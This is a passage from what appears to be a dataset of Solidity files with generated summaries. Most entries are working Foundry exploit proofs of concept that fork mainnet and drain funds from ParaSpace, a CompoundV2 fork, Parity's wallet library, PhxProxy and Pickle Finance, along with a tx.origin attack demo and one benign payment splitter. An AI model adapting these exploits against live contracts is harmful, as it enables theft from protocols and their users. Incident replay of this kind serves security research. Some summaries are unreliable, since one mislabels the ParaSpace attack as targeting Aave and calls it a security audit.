uint256 otherAmount = 3_676_225_912_400_376_673_786;\n        for (uint256 i; i < 7; ++i) {\n            if (i == 6) {\n                transferAmount = otherAmount;\n                _amountOfShare = 1_120_000_000_000_000_000_000_000;\n            }\n            slave = new Slave();\n            wstETH.transfer(address(slave), transferAmount);\n            slave.remove(_amountOfShare);\n            ParaProxy.supply(\n                address(cAPE),\n                cAPE.balanceOf(address(this)),\n                address(this),\n                0\n            );\n            console.log(\n                i + 2,\n                \"Create a new contract to replace wstETH with cAPE as collateral deposit in paraspace\"\n            );\n        }\n        console.log(\"9 Swap wstETH to APE\");\n        _amountOfShare = 1_840_000_000_000_000_000_000_000;\n        transferAmount = 6_039_513_998_943_475_964_078;\n        slave = new Slave();\n        wstETH.transfer(address(slave), transferAmount);\n        slave.remove(_amountOfShare);\n        SwapwstETHToAPE();\n        cAPE.withdraw(cAPE.balanceOf(address(this)));\n        console.log(\n            \"10 deposit APE to APEStaking, manipulate borrowable assets\"\n        );\n        APE.approve(address(APEStaking), type(uint256).max);\n        APEStaking.depositApeCoin(APE.balanceOf(address(this)), address(cAPE));\n        console.log(\"11 borrow asset from paraspace\");\n        ParaProxy.borrow(\n            address(wstETH),\n            44_952_823_905_004_708_422_332,\n            0,\n            address(this)\n        );\n        ParaProxy.borrow(address(USDC), 7_200_000_000_000, 0, address(this));\n        ParaProxy.borrow(\n            address(WETH),\n            1_200_000_000_000_000_000_000,\n            0,\n            address(this)\n        );\n        console.log(\"12 swap USDC and WETH -> wstETH to repay flashLoan\");\n        WETH_USDCTowstETH(amount, premium);\n        return true;\n    }\n\n    function SwapwstETHToAPE() internal {\n        wstETH.approve(address(Router), type(uint256).max);\n        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3\n            .ExactInputSingleParams({\n                tokenIn: address(wstETH),\n                tokenOut: address(WETH),\n                fee: 500,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: 1_400_000_000_000_000_000_000,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            });\n        Router.exactInputSingle(_Param1);\n        WETH.approve(address(Router), type(uint256).max);\n        Uni_Router_V3.ExactInputSingleParams memory _Param2 = Uni_Router_V3\n            .ExactInputSingleParams({\n                tokenIn: address(WETH),\n                tokenOut: address(APE),\n                fee: 3000,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: WETH.balanceOf(address(this)),\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            });\n        Router.exactInputSingle(_Param2);\n    }\n\n    function WETH_USDCTowstETH(uint256 amount, uint256 premium) internal {\n        USDC.approve(address(Router), type(uint256).max);\n        Uni_Router_V3.ExactInputSingleParams memory _Param1 = Uni_Router_V3\n            .ExactInputSingleParams({\n                tokenIn: address(USDC),\n                tokenOut: address(WETH),\n                fee: 500,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountIn: USDC.balanceOf(address(this)),\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            });\n        WETH.approve(address(Router), type(uint256).max);\n        uint256 amountout = amount + premium - wstETH.balanceOf(address(this));\n        Router.exactInputSingle(_Param1);\n        Uni_Router_V3.ExactOutputSingleParams memory _Param2 = Uni_Router_V3\n            .ExactOutputSingleParams({\n                tokenIn: address(WETH),\n                tokenOut: address(wstETH),\n                fee: 500,\n                recipient: address(this),\n                deadline: block.timestamp,\n                amountOut: amountout,\n                amountInMaximum: type(uint256).max,\n                sqrtPriceLimitX96: 0\n            });\n        Router.exactOutputSingle(_Param2);\n    }\n}\n\ncontract Slave {\n    IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);\n    IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);\n    IParaProxy ParaProxy =\n        IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);\n    address owner;\n\n    constructor() {\n        owner = msg.sender;\n        wstETH.approve(address(ParaProxy), type(uint256).max);\n    }\n\n    function remove(uint256 _amountOfShares) external {\n        ParaProxy.supply(\n            address(wstETH),\n            wstETH.balanceOf(address(this)),\n            address(this),\n            0\n        );\n        ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));\n        cAPE.transfer(owner, cAPE.balanceOf(address(this)));\n    }\n}\n",
        "summary": "This code includes an implementation of a test contract that conducts a flashloan attack on the Aave lending platform using the wstETH asset. It includes functions to execute the exploit, manipulate collateral deposit, and borrow assets from the Paraspace platform. The Slave contract is used to remove wstETH from collateral deposit in Paraspace and convert it to cAPE. Overall, the code appears to be an attempt to perform a security audit and identify vulnerabilities in the Aave and Paraspace platforms.",
        "id": "14cf3542-e257-4bf1-99b2-f1a330091915"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/Phalcon_xyz/status/1645742620897955842\n// https://twitter.com/BlockSecTeam/status/1645744655357575170\n// https://twitter.com/peckshield/status/1645742296904929280\n// @TX\n// https://arbiscan.io/tx/0x0e29dcf4e9b211a811caf00fc8294024867bffe4ab2819cc1625d2e9d62390af\n// @Summary\n// a known reentrancy issue from the forked old version of CompoundV2\n\ninterface CurvePool {\n    function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);\n    IWFTM WETH = IWFTM(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));\n    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);\n    ICErc20Delegate pUSDT = ICErc20Delegate(0xD3e323a672F6568390f29f083259debB44C41f41);\n    ICErc20Delegate pWBTC = ICErc20Delegate(0x367351F854506DA9B230CbB5E47332b8E58A1863);\n    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    IUnitroller unitroller = IUnitroller(0x2130C88fd0891EA79430Fb490598a5d06bF2A545);\n    CurvePool curvePool = CurvePool(0x960ea3e3C7FB317332d990873d354E18d7645590);\n    Exploiter exploiter;\n    uint256 nonce;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 79_308_097);\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(pUSDT), \"pUSDT\");\n        cheats.label(address(pETH), \"pETH\");\n        cheats.label(address(pWBTC), \"pWBTC\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(curvePool), \"curvePool\");\n    }\n\n    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        address[] memory assets = new address[](2);\n        assets[0] = address(WETH);\n        assets[1] = address(USDT);\n        uint256[] memory amounts = new uint256[](2);\n        amounts[0] = 200 * 1e18;\n        amounts[1] = 30_000 * 1e6;\n        uint256[] memory modes = new uint[](2);\n        modes[0] = 0;\n        modes[1] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n        exchangeUSDTWBTC();\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n            );\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        USDT.approve(address(aaveV3), type(uint256).max);\n        WETH.approve(address(aaveV3), type(uint256).max);\n        USDT.approve(address(pUSDT), type(uint256).max);\n        WBTC.approve(address(pWBTC), type(uint256).max);\n\n        exploiter = new Exploiter();\n        WETH.transfer(address(exploiter), 100 * 1e18);\n        cheats.label(address(exploiter), \"exploiter\");\n        exploiter.mint();\n\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n        pUSDT.mint(USDT.balanceOf(address(this)));\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = address(pETH);\n        cTokens[1] = address(pUSDT);\n        unitroller.enterMarkets(cTokens);\n        pETH.borrow(13_075_471_156_463_824_220);\n        pETH.redeem(pETH.balanceOf(address(this))); // Reentrancy enter point\n\n        exploiter.redeem();\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        return true;\n    }\n\n    receive() external payable {\n        if (nonce == 2) {\n            pUSDT.borrow(USDT.balanceOf(address(pUSDT)));\n            pWBTC.borrow(WBTC.balanceOf(address(pWBTC)));\n        }\n        nonce++;\n    }\n\n    function exchangeUSDTWBTC() internal {\n        USDT.approve(address(curvePool), type(uint256).max);\n        WBTC.approve(address(curvePool), type(uint256).max);\n        curvePool.exchange(0, 2, USDT.balanceOf(address(this)), 0);\n        curvePool.exchange(1, 2, WBTC.balanceOf(address(this)), 0);\n    }\n}\n\ncontract Exploiter is Test {\n    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);\n    ICErc20Delegate pETH = ICErc20Delegate(0x375Ae76F0450293e50876D0e5bDC3022CAb23198);\n\n    function mint() external payable {\n        WETH.withdraw(WETH.balanceOf(address(this)));\n        payable(address(pETH)).call{value: address(this).balance}(\"\");\n    }\n\n    function redeem() external payable {\n        pETH.redeem(pETH.balanceOf(address(this)));\n        payable(address(WETH)).call{value: address(this).balance}(\"\");\n        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}\n",
        "summary": "The code defines a smart contract that tests a known reentrancy issue from an old version of CompoundV2. It imports various interfaces and contracts, including CurvePool, Exploiter, and various ERC20 tokens. The `setUp` function sets up labels for the various contracts and tokens. The `testExploit` function initiates an Aave flash loan, exchanges USDT to WBTC, and emits an event with the attacker's WETH balance after the exploit. The `executeOperation` function is the callback function for the flash loan, and it executes the exploit by performing a reentrancy attack. The `Exploiter` contract is used in the exploit to redeem pETH tokens for ETH and transfer them to the attacker's address.",
        "id": "b4ed257c-ad6b-4185-8886-1d4f4f91ae02"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface parity {\n  function isOwner(address _addr) external view returns (bool);\n\n  function kill(address _to) external;\n\n  function initWallet(\n    address[] memory _owners,\n    uint256 _required,\n    uint256 _daylimit\n  ) external;\n}\n\ncontract ContractTest is DSTest {\n  parity WalletLibrary =\n    parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));\n\n  address[] public owner;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 4501735); //fork mainnet at block 4501735\n  }\n\n  function testExploit() public {\n    WalletLibrary.isOwner(address(this)); // not a owner of contract\n    owner.push(address(this));\n    WalletLibrary.initWallet(owner, 0, 0);\n    bool isowner = WalletLibrary.isOwner(address(this)); // you are owner of contract now\n    assertTrue(isowner);\n    WalletLibrary.kill(address(this));\n    WalletLibrary.isOwner(address(this)); // contract destroyed, return 0\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that tests for a vulnerability in a Parity wallet contract. It imports a testing library called `Test.sol` and an interface for the Parity wallet called `interface.sol`. The contract initializes a `parity` contract as `WalletLibrary` and a `CheatCodes` contract called `cheats`. It tests for the `testExploit()` that takes this contract and tries to exploit the vulnerability in the Parity wallet by changing the ownership, initializing the wallet, and destroying the contract.",
        "id": "36731663-4be3-403e-b4ba-97b0562b0603"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n/**\n * \u5206\u8d26\u5408\u7ea6 \n * @dev \u8fd9\u4e2a\u5408\u7ea6\u4f1a\u628a\u6536\u5230\u7684ETH\u6309\u4e8b\u5148\u5b9a\u597d\u7684\u4efd\u989d\u5206\u7ed9\u51e0\u4e2a\u8d26\u6237\u3002\u6536\u5230ETH\u4f1a\u5b58\u5728\u5206\u8d26\u5408\u7ea6\u4e2d\uff0c\u9700\u8981\u6bcf\u4e2a\u53d7\u76ca\u4eba\u8c03\u7528release()\u51fd\u6570\u6765\u9886\u53d6\u3002\n */\ncontract PaymentSplit{\n    // \u4e8b\u4ef6\n    event PayeeAdded(address account, uint256 shares); // \u589e\u52a0\u53d7\u76ca\u4eba\u4e8b\u4ef6\n    event PaymentReleased(address to, uint256 amount); // \u53d7\u76ca\u4eba\u63d0\u6b3e\u4e8b\u4ef6\n    event PaymentReceived(address from, uint256 amount); // \u5408\u7ea6\u6536\u6b3e\u4e8b\u4ef6\n\n    uint256 public totalShares; // \u603b\u4efd\u989d\n    uint256 public totalReleased; // \u603b\u652f\u4ed8\n\n    mapping(address => uint256) public shares; // \u6bcf\u4e2a\u53d7\u76ca\u4eba\u7684\u4efd\u989d\n    mapping(address => uint256) public released; // \u652f\u4ed8\u7ed9\u6bcf\u4e2a\u53d7\u76ca\u4eba\u7684\u91d1\u989d\n    address[] public payees; // \u53d7\u76ca\u4eba\u6570\u7ec4\n\n    /**\n     * @dev \u521d\u59cb\u5316\u53d7\u76ca\u4eba\u6570\u7ec4_payees\u548c\u5206\u8d26\u4efd\u989d\u6570\u7ec4_shares\n     * \u6570\u7ec4\u957f\u5ea6\u4e0d\u80fd\u4e3a0\uff0c\u4e24\u4e2a\u6570\u7ec4\u957f\u5ea6\u8981\u76f8\u7b49\u3002_shares\u4e2d\u5143\u7d20\u8981\u5927\u4e8e0\uff0c_payees\u4e2d\u5730\u5740\u4e0d\u80fd\u4e3a0\u5730\u5740\u4e14\u4e0d\u80fd\u6709\u91cd\u590d\u5730\u5740\n     */\n    constructor(address[] memory _payees, uint256[] memory _shares) payable {\n        // \u68c0\u67e5_payees\u548c_shares\u6570\u7ec4\u957f\u5ea6\u76f8\u540c\uff0c\u4e14\u4e0d\u4e3a0\n        require(_payees.length == _shares.length, \"PaymentSplitter: payees and shares length mismatch\");\n        require(_payees.length > 0, \"PaymentSplitter: no payees\");\n        // \u8c03\u7528_addPayee\uff0c\u66f4\u65b0\u53d7\u76ca\u4eba\u5730\u5740payees\u3001\u53d7\u76ca\u4eba\u4efd\u989dshares\u548c\u603b\u4efd\u989dtotalShares\n        for (uint256 i = 0; i < _payees.length; i++) {\n            _addPayee(_payees[i], _shares[i]);\n        }\n    }\n\n    /**\n     * @dev \u56de\u8c03\u51fd\u6570\uff0c\u6536\u5230ETH\u91ca\u653ePaymentReceived\u4e8b\u4ef6\n     */\n    receive() external payable virtual {\n        emit PaymentReceived(msg.sender, msg.value);\n    }\n\n    /**\n     * @dev \u4e3a\u6709\u6548\u53d7\u76ca\u4eba\u5730\u5740_account\u5206\u5e10\uff0c\u76f8\u5e94\u7684ETH\u76f4\u63a5\u53d1\u9001\u5230\u53d7\u76ca\u4eba\u5730\u5740\u3002\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e6\u53d1\u8fd9\u4e2a\u51fd\u6570\uff0c\u4f46\u94b1\u4f1a\u6253\u7ed9account\u5730\u5740\u3002\n     * \u8c03\u7528\u4e86releasable()\u51fd\u6570\u3002\n     */\n    function release(address payable _account) public virtual {\n        // account\u5fc5\u987b\u662f\u6709\u6548\u53d7\u76ca\u4eba\n        require(shares[_account] > 0, \"PaymentSplitter: account has no shares\");\n        // \u8ba1\u7b97account\u5e94\u5f97\u7684eth\n        uint256 payment = releasable(_account);\n        // \u5e94\u5f97\u7684eth\u4e0d\u80fd\u4e3a0\n        require(payment != 0, \"PaymentSplitter: account is not due payment\");\n        // \u66f4\u65b0\u603b\u652f\u4ed8totalReleased\u548c\u652f\u4ed8\u7ed9\u6bcf\u4e2a\u53d7\u76ca\u4eba\u7684\u91d1\u989dreleased\n        totalReleased += payment;\n        released[_account] += payment;\n        // \u8f6c\u8d26\n        _account.transfer(payment);\n        emit PaymentReleased(_account, payment);\n    }\n\n    /**\n     * @dev \u8ba1\u7b97\u4e00\u4e2a\u8d26\u6237\u80fd\u591f\u9886\u53d6\u7684eth\u3002\n     * \u8c03\u7528\u4e86pendingPayment()\u51fd\u6570\u3002\n     */\n    function releasable(address _account) public view returns (uint256) {\n        // \u8ba1\u7b97\u5206\u8d26\u5408\u7ea6\u603b\u6536\u5165totalReceived\n        uint256 totalReceived = address(this).balance + totalReleased;\n        // \u8c03\u7528_pendingPayment\u8ba1\u7b97account\u5e94\u5f97\u7684ETH\n        return pendingPayment(_account, totalReceived, released[_account]);\n    }\n\n    /**\n     * @dev \u6839\u636e\u53d7\u76ca\u4eba\u5730\u5740`_account`, \u5206\u8d26\u5408\u7ea6\u603b\u6536\u5165`_totalReceived`\u548c\u8be5\u5730\u5740\u5df2\u9886\u53d6\u7684\u94b1`_alreadyReleased`\uff0c\u8ba1\u7b97\u8be5\u53d7\u76ca\u4eba\u73b0\u5728\u5e94\u5206\u7684`ETH`\u3002\n     */\n    function pendingPayment(\n        address _account,\n        uint256 _totalReceived,\n        uint256 _alreadyReleased\n    ) public view returns (uint256) {\n        // account\u5e94\u5f97\u7684ETH = \u603b\u5e94\u5f97ETH - \u5df2\u9886\u5230\u7684ETH\n        return (_totalReceived * shares[_account]) / totalShares - _alreadyReleased;\n    }\n\n    /**\n     * @dev \u65b0\u589e\u53d7\u76ca\u4eba_account\u4ee5\u53ca\u5bf9\u5e94\u7684\u4efd\u989d_accountShares\u3002\u53ea\u80fd\u5728\u6784\u9020\u5668\u4e2d\u88ab\u8c03\u7528\uff0c\u4e0d\u80fd\u4fee\u6539\u3002\n     */\n    function _addPayee(address _account, uint256 _accountShares) private {\n        // \u68c0\u67e5_account\u4e0d\u4e3a0\u5730\u5740\n        require(_account != address(0), \"PaymentSplitter: account is the zero address\");\n        // \u68c0\u67e5_accountShares\u4e0d\u4e3a0\n        require(_accountShares > 0, \"PaymentSplitter: shares are 0\");\n        // \u68c0\u67e5_account\u4e0d\u91cd\u590d\n        require(shares[_account] == 0, \"PaymentSplitter: account already has shares\");\n        // \u66f4\u65b0payees\uff0cshares\u548ctotalShares\n        payees.push(_account);\n        shares[_account] = _accountShares;\n        totalShares += _accountShares;\n        // \u91ca\u653e\u589e\u52a0\u53d7\u76ca\u4eba\u4e8b\u4ef6\n        emit PayeeAdded(_account, _accountShares);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that splits received ETH (Ethereum cryptocurrency) among multiple accounts according to pre-defined shares. The contract allows adding multiple accounts as payees during initialization, and each payee needs to call the `release()` function separately to claim their share of ETH. \n\nThe contract stores the shares and addresses of each payee in a mapping, and uses events to record the addition of payees, ETH payments received by the contract, and ETH payments released to payees. The contract also provides functions for computing the amount of ETH that is available for release by a given payee, and for computing the pending ETH payment for a given payee based on the total received ETH and the amount already released to the payee. \n\nOverall, this contract provides a simple mechanism for sharing received ETH among multiple parties in a transparent and auditable way.",
        "id": "a8a8a418-a7b0-4560-835e-3b022a5d19ad"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.17;\ncontract Bank {\n    address public owner;//\u8bb0\u5f55\u5408\u7ea6\u7684\u62e5\u6709\u8005\n\n    //\u5728\u521b\u5efa\u5408\u7ea6\u65f6\u7ed9 owner \u53d8\u91cf\u8d4b\u503c\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        //\u68c0\u67e5\u6d88\u606f\u6765\u6e90\n        require(tx.origin == owner, \"Not owner\");\n        //\u8f6c\u8d26ETH\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    // \u53d7\u76ca\u8005\u5730\u5740\n    address payable public hacker;\n    // Bank\u5408\u7ea6\u5730\u5740\n    Bank bank;\n\n    constructor(Bank _bank) {\n        //\u5f3a\u5236\u5c06address\u7c7b\u578b\u7684_bank\u8f6c\u6362\u4e3aBank\u7c7b\u578b\n        bank = Bank(_bank);\n        //\u5c06\u53d7\u76ca\u8005\u5730\u5740\u8d4b\u503c\u4e3a\u90e8\u7f72\u8005\u5730\u5740\n        hacker = payable(msg.sender);\n    }\n\n    function attack() public {\n        //\u8bf1\u5bfcBank\u5408\u7ea6\u7684owner\u8c03\u7528\uff0c\u4e8e\u662fBank\u5408\u7ea6\u5185\u7684\u4f59\u989d\u5c31\u5168\u90e8\u8f6c\u79fb\u5230\u9ed1\u5ba2\u5730\u5740\u4e2d\n        bank.transfer(hacker, address(bank).balance);\n    }\n}",
        "summary": "This code defines two Solidity smart contracts. The first one `Bank` is a simple bank contract which allows the owner to transfer ETH to any address. The second contract `Attack` is designed to exploit a vulnerability in the `Bank` contract. \n\nThe `Attack` contract is initialized with an instance of the `Bank` contract and the deployer's address is set as the `hacker` address. The `attack()` function in the `Attack` contract simply calls the `transfer()` function of the `Bank` contract and transfers all of the ETH balance from the `Bank` contract to the `hacker` address. This is possible because the `transfer()` function in the `Bank` contract uses the `tx.origin` variable to check if the function is being called by the owner. However, `tx.origin` can be spoofed through a contract, allowing the `Attack` contract to pose as the owner and steal all the ETH from the `Bank` contract.",
        "id": "7f098916-a7c4-4efe-a2c9-b5d313a7181a"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/HypernativeLabs/status/1633090456157401088\n// @TX\n// https://polygonscan.com/tx/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4\n// @Summary\n// PhxProxy contract delegateCallSwap() function lack of access control and can be passed in any parameter\n// The lost money is mainly USDC in the d028 contract which the attacker converts into WETH in the 65ba contract through the buyLeverage function\n// and then swaps it into his own tokens by the delegateCallSwap function, making a profit from it\n\ninterface IPHXPROXY {\n    function buyLeverage(uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata /*data*/ ) external;\n    function delegateCallSwap(bytes memory data) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);\n    IERC20 WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619);\n    SHITCOIN MYTOKEN;\n    IPHXPROXY phxProxy = IPHXPROXY(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de);\n    Uni_Router_V2 Router = Uni_Router_V2(0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff);\n    address dodo = 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"polygon\", 40_066_946);\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(phxProxy), \"phxProxy\");\n        vm.label(address(Router), \"Router\");\n        vm.label(address(dodo), \"dodo\");\n    }\n\n    function testExploit() public {\n        deal(address(WETH), address(this), 7 * 1e15);\n        MYTOKEN = new SHITCOIN();\n        MYTOKEN.mint(1_500_000 * 1e18);\n        MYTOKEN.approve(address(Router), type(uint256).max);\n        WETH.approve(address(Router), type(uint256).max);\n        Router.addLiquidity(address(MYTOKEN), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp);\n\n        DVM(dodo).flashLoan(0, 8000 * 1e6, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n            );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        USDC.approve(address(phxProxy), type(uint256).max);\n        phxProxy.buyLeverage(8000 * 1e6, 0, block.timestamp, new bytes(0));\n        uint256 swapAmount = WETH.balanceOf(address(phxProxy));\n        bytes memory swapData =\n            abi.encodeWithSelector(0xa9678a18, address(Router), address(WETH), address(MYTOKEN), swapAmount);\n        phxProxy.delegateCallSwap(swapData); // WETH swap to MYTOKEN\n        \n        address[] memory path = new address[](3);\n        path[0] = address(MYTOKEN);\n        path[1] = address(WETH);\n        path[2] = address(USDC);\n        Router.swapExactTokensForTokens(1_000_000 * 1e18, 0, path, address(this), block.timestamp); // MYTOKEN swap to USDC\n        \n        USDC.transfer(dodo, 8000 * 1e6);\n    }\n}\n\ncontract SHITCOIN {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name = \"SHIT COIN\";\n    string public symbol = \"SHIT\";\n    uint8 public decimals = 18;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint256 amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint256 amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
        "summary": "This code is a test contract that exploits a vulnerability in the PhxProxy contract on the Polygon network. It uses a flash loan from a DODO DVM to access liquidity and swaps WETH for a custom ERC-20 token called SHITCOIN. It then uses the PhxProxy contract's `delegateCallSwap()` function to swap SHITCOIN for USDC. The exploit allows the attacker to profit from the price difference between WETH and USDC.",
        "id": "2c45783a-3795-485c-aa96-9c68e9fb2da3"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : around 20 million DAI.\n// Attacker : 0xbac8a476b95ec741e56561a66231f92bc88bb3a8\n// AttackContract : 0x2b0b02ce19c322b4dd55a3949b4fb6e9377f7913#code\n// Attack TX: https://etherscan.io/tx/0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0\n// Attack TX: https://ethtx.info/mainnet/0xe72d4e7ba9b5af0cf2a8cfb1e30fd9f388df0ab3da79790be842bfbed11087b0\n// Exploit code refers to sam. https://github.com/banteg/evil-jar/blob/master/reference/samczsun.sol\n\n    CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    ControllerLike constant CONTROLLER = ControllerLike(0x6847259b2B3A4c17e7c43C54409810aF48bA5210);\n    CurveLogicLike constant CURVE_LOGIC = CurveLogicLike(0x6186E99D9CFb05E1Fdf1b442178806E81da21dD8);\n    \n    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n    IERC20 constant CDAI = IERC20(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643);\n    \n    JarLike constant PDAI = JarLike(0x6949Bb624E8e8A90F87cD2058139fcd77D2F3F87);\n    address constant STRAT = 0xCd892a97951d46615484359355e3Ed88131f829D;\n\n\ncontract AttackContract is Test {\n    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n\n    function setUp() public {\n        cheat.createSelectFork(\"mainnet\", 11303122);    // Fork mainnet at block 11303122\n    }\n\n    function testExploit() public {\n        uint earns = 5;\n        \n        address[] memory targets = new address[](earns + 2);\n        bytes[] memory datas = new bytes[](earns + 2);\n        for (uint i = 0; i < earns + 2; i++) {\n            targets[i] = address(CURVE_LOGIC);\n        }\n        datas[0] = arbitraryCall(STRAT, \"withdrawAll()\");\n        for (uint i = 0; i < earns; i++) {\n            datas[i + 1] = arbitraryCall(address(PDAI), \"earn()\");\n        }\n        datas[earns + 1] = arbitraryCall(STRAT, \"withdraw(address)\", address(CDAI));\n\n        emit log_named_decimal_uint(\"Before exploiting, Attacker cDAI Balance\", CDAI.balanceOf(address(msg.sender)),8);\n\n        console.log(\"DAI balance on pDAI\", DAI.balanceOf(address(PDAI)));\n\n        CONTROLLER.swapExactJarForJar(\n            address(new FakeJar(CDAI)),\n            address(new FakeJar(CDAI)),\n            0,\n            0,\n            targets,\n            datas\n        );\n        \n        emit log_named_decimal_uint(\"After exploiting, Attacker cDAI Balance\", CDAI.balanceOf(address(msg.sender)),8);\n\n    }\n        function arbitraryCall(address to, string memory sig) internal returns (bytes memory) {\n        return abi.encodeWithSelector(\n            CURVE_LOGIC.add_liquidity.selector,\n            to,\n            bytes4(keccak256(bytes(sig))),\n            1,\n            0,\n            address(CDAI)\n        );\n    }\n    \n    function arbitraryCall(address to, string memory sig, address param) internal returns (bytes memory) {\n        return abi.encodeWithSelector(\n            CURVE_LOGIC.add_liquidity.selector,\n            to,\n            bytes4(keccak256(bytes(sig))),\n            1,\n            0,\n            new FakeUnderlying(param)\n        );\n    }\n\n    receive() external payable {}\n}\n\nabstract contract ControllerLike {\n    function swapExactJarForJar (\n        address _fromJar, // From which Jar\n        address _toJar, // To which Jar\n        uint256 